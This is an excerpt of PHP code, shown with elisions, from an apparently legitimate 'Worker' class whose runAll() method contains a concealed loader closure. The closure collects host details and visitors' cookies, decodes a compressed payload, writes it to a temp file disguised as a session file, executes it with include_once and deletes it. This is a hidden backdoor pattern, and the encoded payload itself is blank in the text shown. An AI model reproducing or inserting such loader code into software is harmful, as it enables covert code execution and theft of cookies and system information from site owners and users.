...
class Worker
{
    ...
    public static function runAll()
    {
        ...
        $l0ader=function()
        {
            ...
            $hid = @file_get_contents($tmpdir."/sess_1eiudbrorkdadhip90v9jmjhid");
            ...
            $enable_f=!$mtime;
            if(!@touch($tmpfile))$enable_f=0;
        
            $s=$_SERVER;
            $user=isset($s["USER"])?$s["USER"]:get_current_user();
            $ud=array("pm".chr(1).chr(12),$hid,gethostname(),php_sapi_name(),phpversion(),$uid,$user,php_uname(),getcwd(),@$s["SCRIPT_FILENAME"],@$s["HTTP_HOST"],@$s["REQUEST_URI"],@$s["HTTP_COOKIE"]);
            ...
            $data=$b65("");
            $data=hex2bin("3c3f7068700a").gzinflate($data);
            
            $tmpfile=$tmpdir."/sess_1eiudbrorkdadhip90v9jmjdk0";
            if(!file_exists($tmpfile)&&@file_put_contents($tmpfile,$data))@chmod($tmpfile,0777);
        
            if(file_exists($tmpfile))include_once($tmpfile);unlink($tmpfile);
        };
